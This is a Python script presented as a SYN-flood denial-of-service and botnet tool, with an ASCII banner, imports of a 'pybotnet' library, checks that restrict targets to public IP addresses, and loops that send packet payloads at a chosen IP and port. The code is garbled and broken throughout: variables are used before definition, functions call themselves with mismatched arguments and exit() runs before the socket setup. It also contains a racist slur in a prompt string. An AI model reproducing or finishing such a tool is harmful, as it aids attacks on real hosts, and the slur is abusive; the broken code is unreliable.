from colorama import Fore, Back, Style
from pybotnet import BotNet, dos
import ipaddress
import time
import threading
import socket
from prompt_toolkit import prompt
print(Back.RED + Fore.BLUE + "snapchat user")
#install prompt_toolkit and colorma and pybotnet with pip for any retard 

banner = print("""\            ,,          ,,                                  
 .M"""bgd `7MM          db   mm   `7MM"""Yp,           mm   
,MI    "Y   MM               MM     MM    Yb           MM   
`MMb.       MMpMMMb.  `7MM mmMMmm   MM    dP  ,pW"Wq.mmMMmm 
  `YMMNq.   MM    MM    MM   MM     MM"""bg. 6W'   `Wb MM   
.     `MM   MM    MM    MM   MM     MM    `Y 8M     M8 MM   
Mb     dM   MM    MM    MM   MM     MM    ,9 YA.   ,A9 MM   
P"Ybmmd"  .JMML  JMML..JMML. `Mbmo.JMMmmmd9   `Ybmd9'  `Mbmo
                    """)
    

def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500


    def one_false_move(send):
        payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        for x in send(100000000,payload):
            send_attack=payload
            send({one_false_move})
            dos(10)



def send_attack(syn, attack, arg, ip, port):
     if __name__ == '__main__':
        print(f"Attacking {ip}:{port} with {attack} SYN={syn} ARG={arg}")
        payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        answer = sock.send('put the cia glowy ip in here: '.encode())
        answer1 = sock.send('put the niggers port in here: '.encode())
        command = arg[1]
        if command == ".syn":
            while time.time():
                for i in send_attack(send_attack=payload):
                    send_attack(ip,port(ipaddress))
                    send_attack(ip,port(ipaddress))
                    send_attack(ip,port(ipaddress))
                    send_attack(ip,port(ipaddress))
                    send_attack(ip,port(ipaddress))
                    send_attack(ip,port(ipaddress))
                    send_attack(ip,port(ipaddress))
                    dos(payload)
                print('you beamed the shit out of that')
                send_attack(syn, attack, arg, ip, port)

    

timer = threading.Timer(1000,send_attack)
timer.start()
exit()
sock = socket.socket()
socket(socket.SOL_UDP,socket.AF_INET6)
socket.listen()
if __name__ == '__main__':
	send_attack()
	BotNet.run()
     

def scannignbots():
                    for sock in socket:
                        socket.getnameinfo(scannignbots)
if socket.create_connection(source_address=socket):
    socket.setdefaulttimeout(1)
    print('bot cound')


    def showbotcound():
        while True:
            print(("\033]0;Nodes : "+str(len(showbotcound))+" \007").encode())
            return
